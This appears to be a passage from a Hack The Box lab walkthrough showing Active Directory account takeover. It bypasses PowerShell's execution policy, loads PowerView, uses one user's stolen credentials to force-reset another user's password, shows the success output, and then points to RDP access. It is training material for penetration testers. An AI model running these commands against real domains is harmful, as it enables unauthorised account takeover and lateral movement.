#### Import PowerView Module

```powershell-session
Set-ExecutionPolicy Bypass -Force
Import-Module C:\tools\PowerView.ps1
```

Create a PSCredential object with Grace's credentials:

```powershell-session
$SecPassword = ConvertTo-SecureString 'Password11' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\grace', $SecPassword)
```

Then create a secure string object for the password we want to set to Rosy:

```powershell-session
$UserPassword = ConvertTo-SecureString 'NewRossyCreds!' -AsPlainText -Force
```

Use the function `Set-DomainUserPassword` with the option `-Identity`, which corresponds to the account we want to change its password (rosy), add the option `-AccountPassword` with the variable that has the new password, use the option `-Credential` to execute this command using Grace's credentials. Finally, set the option `-Verbose` to see if the change was successful.

```powershell-session
PS C:\htb> Set-DomainUserPassword -Identity rosy -AccountPassword $UserPassword -Credential $Cred -Verbose
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'rosy'
VERBOSE: [Set-DomainUserPassword] Password for user 'rosy' successfully reset
```

We can now connect via RDP to `SRV01` using `Rosy` account.